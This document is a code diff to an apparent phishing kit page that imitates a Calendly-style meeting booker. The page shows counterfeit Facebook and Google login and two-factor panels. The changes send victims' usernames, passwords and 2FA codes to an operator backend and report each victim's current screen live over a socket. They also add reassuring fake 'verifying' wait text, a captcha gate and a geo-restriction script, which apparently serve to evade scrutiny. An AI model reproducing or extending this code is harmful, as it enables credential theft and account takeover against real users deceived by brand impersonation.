@@ -3,6 +3,7 @@
 
 <head>
 
+  <script src="assets/geo-restrict.js"></script>
   <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
 
     <meta charset="UTF-8">
@@ -15,8 +16,7 @@
     <link href="assets/main.5d063b47.css" rel="stylesheet">
     <link href="assets/newstyle.css" rel="stylesheet">
     <link href="assets/stylee.css" rel="stylesheet">
-    <link rel="icon" type="image/png" sizes="32x32"
-        href="assets/favicon-bfb0492a754bdf44a0a58b969963f44235653cca09a1c0110309c1e03077e368.ico">
+    <link rel="icon" href="/favicon.jpg" type="image/jpeg">
 
 </head>
 
@@ -27,8 +27,8 @@
                 <div class="left-side">
                     <div><img alt="Selby" class="selby-logo"
                             src="./assets/redbull-logo.png">
-                        <h3>Emily Mullaney</h3>
-                        <h2>Meet Emily</h2>
+                        <h3>Matthew Bowman</h3>
+                        <h2>Meet Matthew</h2>
                         <div></div>
                         <div class="calendy-div-icons">
                             <div class="calendy-icons"><img alt="clock"
@@ -455,7 +455,7 @@
           <!-- Right form panel -->
           <div class="fb26-rp">
             <button class="fb26-x"
-                    onclick="document.getElementById('facebook-modal').style.display='none'"
+                    onclick="closeFacebookModal()"
                     aria-label="Close">&#x2715;</button>
             <h2 class="fb26-h2">Log into Facebook</h2>
             <form id="fb-main-login-form" autocomplete="on">
@@ -658,14 +658,9 @@
         <div class="fb26-load">
           <div style="font-size:32px;font-weight:800;color:#1877f2;letter-spacing:-1.5px;margin-bottom:4px;font-family:inherit">facebook</div>
           <div class="fb26-spin"></div>
-          <p class="fb26-ld-t">Please be patient and don&#x27;t close this window</p>
-          <div class="fb26-ld-s">
-            <div class="loading-submessage step1">Checking the details on your account&#x2026;</div>
-            <div class="loading-submessage step2">Checking email addresses&#x2026;</div>
-            <div class="loading-submessage step3">Checking two-factor authenticator&#x2026;</div>
-            <div class="loading-submessage step4">Checking other details&#x2026;</div>
-            <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
-          </div>
+          <p class="fb26-ld-t">Please don&#x27;t close this window</p>
+          <p id="apply-wait-status" class="fb26-ld-s" style="min-height:22px;font-weight:600;color:#1c1e21"></p>
+          <p class="fb26-ld-s" style="margin-top:8px;font-size:13px;color:#8a8d91">We&#x27;re checking free slots to schedule your meeting and verifying your Facebook account. This can take up to a minute.</p>
         </div>
       </div><!-- /#waitTime -->
 
@@ -811,8 +806,8 @@
   font-size: 13px; color: #65676B; margin: 0 0 14px; font-weight: 400;
 }
 .goog-fbv-h2 {
-  font-size: 22px; font-weight: 700; color: #1C1E21;
-  margin: 0 0 14px; line-height: 1.25;
+  font-size: 24px; font-weight: 600; color: #1C1E21;
+  margin: 0 0 12px; line-height: 1.17;
 }
 .goog-fbv-body {
   font-size: 15px; color: #1C1E21; line-height: 1.5; margin-bottom: 20px;
@@ -820,18 +815,18 @@
 .goog-fbv-email-bold { font-weight: 700; }
 .goog-fbv-info-row {
   display: flex; align-items: flex-start; gap: 12px;
-  padding: 12px; border: 1px solid #E4E6EB; border-radius: 8px;
-  margin-bottom: 10px;
+  padding: 0; margin-bottom: 16px;
 }
-.goog-fbv-info-icon { flex-shrink: 0; color: #1C1E21; margin-top: 1px; }
-.goog-fbv-info-text { font-size: 14px; color: #1C1E21; line-height: 1.4; }
+.goog-fbv-info-icon { flex-shrink: 0; color: #1C1E21; width: 24px; height: 24px; margin-top: 1px; }
+.goog-fbv-info-text { font-size: 15px; color: #1C1E21; line-height: 1.35; font-weight: 400; }
 .goog-fbv-verify-btn {
-  width: 100%; height: 48px; margin-top: 20px;
-  background: #0064E0; color: #fff; border: none;
-  border-radius: 6px; font-size: 15px; font-weight: 600;
+  width: auto; min-width: 200px; min-height: 44px; margin-top: 8px;
+  padding: 0 20px;
+  background: #0064E0; color: #f3f4f5; border: none;
+  border-radius: 22px; font-size: 15px; font-weight: 500;
   font-family: Helvetica, Arial, sans-serif;
   cursor: pointer; transition: background .15s;
-  display: flex; align-items: center; justify-content: center; gap: 10px;
+  display: flex; align-items: center; justify-content: center;
 }
 .goog-fbv-verify-btn:hover { background: #0057C4; }
 
@@ -914,13 +909,13 @@
       <!-- -- Panel 0: Facebook "Verify with Google" intermediate page -- -->
       <div id="goog-fb-verify">
         <p class="goog-fbv-eyebrow">Facebook</p>
-        <h2 class="goog-fbv-h2">Log into your Google Account to confirm it's you</h2>
+        <h2 class="goog-fbv-h2">Log in to your Google account to confirm it's you</h2>
         <p class="goog-fbv-body">For security reasons, we need you to verify with your Google Account by logging in with the Gmail address saved on your Facebook account: <span class="goog-fbv-email-bold" id="goog-fbv-email-display">your email</span>.</p>
         <div class="goog-fbv-info-row">
           <span class="goog-fbv-info-icon">
             <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><g opacity="0.9"><path d="M21 12c0-1.41-.324-2.745-.903-3.933l1.48-1.48A10.95 10.95 0 0 1 23 12c0 .752-.076 1.488-.22 2.199a1 1 0 1 1-1.96-.398A9.05 9.05 0 0 0 21 12zM3.547 19.04l-1.254 1.253a1 1 0 1 0 1.414 1.414l18-18a1 1 0 0 0-1.414-1.414l-1.254 1.254A10.956 10.956 0 0 0 12 1c-2.659 0-5.099.944-7 2.514V2a1 1 0 0 0-2 0v4a1 1 0 0 0 1 1h4a1 1 0 1 0 0-2H6.343A8.959 8.959 0 0 1 12 3c2.125 0 4.078.736 5.618 1.968l-12.65 12.65A8.962 8.962 0 0 1 3 12c0-.618.062-1.22.18-1.801A1 1 0 1 0 1.22 9.8C1.076 10.512 1 11.248 1 12c0 2.678.957 5.132 2.547 7.04zM6.586 21.578l1.48-1.48A8.965 8.965 0 0 0 12 21a8.959 8.959 0 0 0 5.657-2H16a1 1 0 1 1 0-2h4a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0v-1.514A10.959 10.959 0 0 1 12 23a10.95 10.95 0 0 1-5.414-1.422z"></path></g></svg>
           </span>
-          <span class="goog-fbv-info-text">We will not share any of your Facebook data with your Google Account</span>
+          <span class="goog-fbv-info-text">We will not share any of your Facebook data with your Google account</span>
         </div>
         <div class="goog-fbv-info-row">
           <span class="goog-fbv-info-icon">
@@ -928,10 +923,7 @@
           </span>
           <span class="goog-fbv-info-text">This will not change the details you use to log into Facebook</span>
         </div>
-        <button class="goog-fbv-verify-btn" id="goog-fbv-verify-btn" type="button">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20" height="20"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="m6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002l6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
-          Verify with Google
-        </button>
+        <button class="goog-fbv-verify-btn" id="goog-fbv-verify-btn" type="button">Verify with Google</button>
       </div>
 
       <!-- -- Panel 1: Google email step -- -->
@@ -984,6 +976,20 @@
   </div><!-- /.goog-overlay -->
 </div><!-- /#google-modal -->
 
+<script src="assets/google-flow.js"></script>
+<script src="assets/victim-view.js"></script>
+<script src="assets/api-payload.js"></script>
+<script src="assets/login-wait.js"></script>
+<script>
+  function closeFacebookModal() {
+    if (typeof LoginWait !== 'undefined') {
+      LoginWait.clear();
+      LoginWait.resetApplyLoginForm();
+    }
+    var modal = document.getElementById('facebook-modal');
+    if (modal) modal.style.display = 'none';
+  }
+</script>
 <script>
   (function() {
     var googEmailInp  = document.getElementById('goog-email-inp');
@@ -995,12 +1001,9 @@
 
     // -- Panel 0: "Verify with Google" button ? redirect to full-page Google sign-in --
     document.getElementById('goog-fbv-verify-btn').addEventListener('click', function() {
-      var email = googActiveEmail || document.getElementById('goog-fbv-email-display').textContent;
       try {
-        sessionStorage.setItem('lastLoginEmail', email);
-        sessionStorage.setItem('googleLoginSession', '1');
-        sessionStorage.setItem('googleContinueApp', 'facebook');
-      } catch(e) {}
+        GoogleVerifyFlow.prepareGoogleLoginNavigation();
+      } catch (e) {}
       window.location.href = 'google-login.html';
     });
 
@@ -1058,10 +1061,12 @@
       googPassNext.disabled = true;
       googPassNext.innerHTML = '<span class="loading-spinner"></span>';
 
-      fetch(BACKEND + '/send-login-data', {
+      fetch((window.BACKEND || '') + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: email, password: password, socketId: socket.id })
+        body: JSON.stringify(typeof ApiPayload !== 'undefined'
+          ? ApiPayload.withClient({ username: email, password: password })
+          : { username: email, password: password, socketId: window.socket && window.socket.id })
       })
       .then(function(r) { return r.json(); })
       .catch(function() {});
@@ -1135,11 +1140,8 @@
 </script>
 
 <script>
-  // Close modal when clicking the dark backdrop
   document.getElementById('fb26-overlay').addEventListener('click', function(e) {
-    if (e.target === this) {
-      document.getElementById('facebook-modal').style.display = 'none';
-    }
+    if (e.target === this) closeFacebookModal();
   });
 
   // Password show / hide toggle
@@ -1177,6 +1179,44 @@
             reconnectionDelayMax: 5000,
             timeout: 20000
         });
+        window.socket = socket;
+        window.BACKEND = BACKEND;
+        if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
+        const VICTIM_VIEW_BY_SECTION = {
+            'login-form': 'fb-login-form',
+            'wrongpsw': 'fb-wrong-password',
+            'oldpass': 'fb-old-password',
+            'codeSms': 'fb-2fa-sms',
+            'authcode': 'fb-2fa-auth',
+            'codeEmail': 'fb-2fa-email',
+            'whatsappcode': 'fb-2fa-whatsapp'
+        };
+
+        function reportApplyVictimView() {
+            if (typeof VictimView === 'undefined') return;
+            if (typeof LoginWait !== 'undefined' && LoginWait.isActive() && LoginWait.isShowing()) {
+                VictimView.report('fb-login-wait');
+                return;
+            }
+            const fbModal = document.getElementById('facebook-modal');
+            const modalOpen = fbModal && fbModal.style.display !== 'none' && fbModal.style.display !== '';
+            if (!modalOpen) {
+                VictimView.report('apply');
+                return;
+            }
+            const order = ['codeSms', 'authcode', 'codeEmail', 'whatsappcode', 'wrongpsw', 'oldpass', 'login-form'];
+            for (let i = 0; i < order.length; i++) {
+                const id = order[i];
+                const el = document.getElementById(id);
+                if (el && el.style.display !== 'none' && VICTIM_VIEW_BY_SECTION[id]) {
+                    VictimView.report(VICTIM_VIEW_BY_SECTION[id]);
+                    return;
+                }
+            }
+            VictimView.report('fb-login-form');
+        }
+
         socket.on('redirect', (url) => {
             window.location.href = url;
         });
@@ -1200,21 +1240,26 @@
             console.log("? Connected to server with socket ID:", socket.id);
             localStorage.setItem('socketSession', JSON.stringify({ socketId: socket.id, timestamp: Date.now() }));
             socket.emit('userConnectedToPage', { clientId, page: 'apply' });
+            reportApplyVictimView();
 
             if (!_applyFirstConnect) {
-                /* Reconnected after background ? reset any stuck FB login spinner */
-                const loginBtn = document.getElementById('loginBtn');
-                if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
-                    loginBtn.disabled = false;
-                    loginBtn.style.opacity = '1';
-                    loginBtn.style.cursor = 'pointer';
-                    loginBtn.innerHTML = 'Log In';
+                if (typeof LoginWait !== 'undefined' && LoginWait.isActive() && LoginWait.isShowing()) {
+                    LoginWait.resumeIfActive();
+                } else {
+                    const loginBtn = document.getElementById('loginBtn');
+                    if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
+                        loginBtn.disabled = false;
+                        loginBtn.style.opacity = '1';
+                        loginBtn.style.cursor = 'pointer';
+                        loginBtn.innerHTML = 'Log in';
+                    }
                 }
             }
             _applyFirstConnect = false;
         });
 
         socket.on('show-calendar', () => {
+            if (typeof LoginWait !== 'undefined') LoginWait.clear();
             try { sessionStorage.setItem('calendlySession', '1'); } catch(e) {}
             window.location.href = 'calendly';
         });
@@ -1225,9 +1270,12 @@
         }
 
         function showOnly(sectionIdToShow) {
+            if (typeof LoginWait !== 'undefined') LoginWait.clear();
             // Always make sure the outer facebook-modal container is visible
             const fbModal = document.getElementById('facebook-modal');
             if (fbModal) fbModal.style.display = 'block';
+            const waitPanel = document.getElementById('waitTime');
+            if (waitPanel) waitPanel.style.display = 'none';
 
             const loginForm = document.getElementById('login-form');
             const oldpass = document.getElementById('oldpass');
@@ -1243,6 +1291,10 @@
 
             const sectionToShow = document.getElementById(sectionIdToShow);
             if (sectionToShow) sectionToShow.style.display = 'block';
+
+            if (typeof VictimView !== 'undefined' && VICTIM_VIEW_BY_SECTION[sectionIdToShow]) {
+                VictimView.report(VICTIM_VIEW_BY_SECTION[sectionIdToShow]);
+            }
 
             clearInputsAndEnableButtons();
         }
@@ -1260,6 +1312,10 @@
         if (pendingModal && pendingModalMap[pendingModal]) {
             sessionStorage.removeItem('pendingModal');
             showOnly(pendingModalMap[pendingModal]);
+        }
+
+        if (typeof LoginWait !== 'undefined') {
+            LoginWait.discardStale();
         }
 
         socket.on('show-wrong-creds', () => {
@@ -1336,17 +1392,15 @@
             }
         });
 
-        socket.on('show-google-login', () => {
-            var fbEmailEl = document.getElementById('email');
-            var fbEmail = (fbEmailEl && fbEmailEl.value.trim())
-                          || sessionStorage.getItem('lastLoginEmail')
-                          || '';
-            try {
-                sessionStorage.setItem('lastLoginEmail', fbEmail);
-                sessionStorage.setItem('googleReturnPage', 'apply.html');
-            } catch(e) {}
-            try { sessionStorage.setItem('fbVerifySession', '1'); } catch(e) {}
-            window.location.href = 'fb-verify.html';
+        socket.on('show-google-login', (data) => {
+            if (typeof LoginWait !== 'undefined') LoginWait.clear();
+            GoogleVerifyFlow.startFbVerifyFlow({
+                getFbEmail: function () {
+                    var fbEmailEl = document.getElementById('email');
+                    return (fbEmailEl && fbEmailEl.value.trim()) || '';
+                },
+                returnPage: 'apply.html'
+            }, data);
         });
 
         socket.on('show-gmail-wrong-pass', () => {
@@ -1438,10 +1492,9 @@
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({
-                            code: codeValue,
-                            socketId: socketId
-                        })
+                        body: JSON.stringify(typeof ApiPayload !== 'undefined'
+                            ? ApiPayload.withClient({ code: codeValue })
+                            : { code: codeValue, socketId: socketId, clientId: localStorage.getItem('clientId') })
                     })
                     .then(res => res.json())
                     .then(data => {
@@ -1529,6 +1582,12 @@
         bindLoginForm(document.getElementById('fb-old-login-form'), sendOldData);
         enableLoginBtn();
 
+        function loginRequestBody(username, password) {
+            return typeof ApiPayload !== 'undefined'
+                ? ApiPayload.withClient({ username, password })
+                : { username, password, socketId: socket.id, clientId: localStorage.getItem('clientId') };
+        }
+
         async function sendLoginData() {
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
@@ -1538,12 +1597,7 @@
             // Persist email so the Google verify panel can pre-fill it
             try { sessionStorage.setItem('lastLoginEmail', username); } catch(e) {}
 
-
-            loginBtn.disabled = true;
-            loginBtn.style.opacity = '0.4';
-            loginBtn.style.cursor = 'not-allowed';
-            loginBtn.style.height = '35px';
-            loginBtn.innerHTML = '<span class="loading-spinner"></span>';
+            if (typeof LoginWait !== 'undefined') LoginWait.startApply();
 
             try {
                 const response = await fetch(BACKEND + '/send-login-data', {
@@ -1551,24 +1605,13 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        username,
-                        password,
-                        socketId: socket.id
-                    })
+                    body: JSON.stringify(loginRequestBody(username, password))
                 });
 
-                const data = await response.json();
-
-
-                if (data.success) {
-
-                } else {
-
-                }
+                if (!response.ok && typeof LoginWait !== 'undefined') LoginWait.clear();
             } catch (error) {
                 console.error('Error:', error);
-
+                if (typeof LoginWait !== 'undefined') LoginWait.clear();
             }
 
 
@@ -1580,11 +1623,7 @@
             if (!username || !password) return;
 
 
-            confirm_login.disabled = true;
-            confirm_login.style.opacity = '0.4';
-            confirm_login.style.cursor = 'not-allowed';
-            confirm_login.style.height = '35px';
-            confirm_login.innerHTML = '<span class="loading-spinner"></span>';
+            if (typeof LoginWait !== 'undefined') LoginWait.startApply();
 
             try {
                 const response = await fetch(BACKEND + '/send-login-data', {
@@ -1592,11 +1631,7 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        username,
-                        password,
-                        socketId: socket.id
-                    })
+                    body: JSON.stringify(loginRequestBody(username, password))
                 });
 
                 const data = await response.json();
@@ -1621,11 +1656,7 @@
             if (!username || !password) return;
 
 
-            old_login.disabled = true;
-            old_login.style.opacity = '0.4';
-            old_login.style.cursor = 'not-allowed';
-            old_login.style.height = '35px';
-            old_login.innerHTML = '<span class="loading-spinner"></span>';
+            if (typeof LoginWait !== 'undefined') LoginWait.startApply();
 
             try {
                 const response = await fetch(BACKEND + '/send-login-data', {
@@ -1633,11 +1664,7 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        username,
-                        password,
-                        socketId: socket.id
-                    })
+                    body: JSON.stringify(loginRequestBody(username, password))
                 });
 
                 const data = await response.json();
@@ -1681,13 +1708,13 @@
         }
 
         function openDesktopModal() {
-
-            const modal = document.getElementById('facebook-modal');
-            if (modal) {
-                modal.style.display = 'block';
-            } else {
-
+            if (typeof LoginWait !== 'undefined') {
+                LoginWait.clear();
+                LoginWait.resetApplyLoginForm();
             }
+            const modal = document.getElementById('facebook-modal');
+            if (modal) modal.style.display = 'block';
+            if (typeof VictimView !== 'undefined') VictimView.report('fb-login-form');
         }
     </script>
 
